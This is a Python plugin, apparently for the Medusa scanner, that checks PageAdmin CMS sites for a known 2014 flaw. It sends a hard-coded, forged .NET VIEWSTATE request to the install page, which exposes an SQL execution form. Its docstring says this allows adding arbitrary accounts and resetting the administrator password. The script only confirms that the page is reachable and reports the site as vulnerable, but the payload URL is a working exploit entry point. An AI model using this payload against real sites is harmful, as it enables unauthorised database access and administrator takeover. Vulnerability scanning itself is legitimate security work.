#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: PageAdmin可“伪造”VIEWSTATE执行任意SQL查询&重置管理员密码
referer: http://www.wooyun.org/bugs/wooyun-2014-061699
author: Lucifer
description: 利用.NET的bug可以伪造viewstate登录到SQL执行页面,添加任意账户并重置管理员密码。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/e/install/index.aspx?__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTExODcwMDU5OTgPZBYCAgEPZBYCAgMPFgIeB1Zpc2libGVoZGQ%3D&ctl02=%E8%BF%90%E8%A1%8CSQL"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload_url = scheme+"://"+url+payload
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if code==200 and con.lower().find('webform_dopostbackwithoptions')!=-1  and con.lower().find('tb_sql')!=-1:
            Medusa = "{} 存在PageAdmin可“伪造”VIEWSTATE执行任意SQL查询&重置管理员密码漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass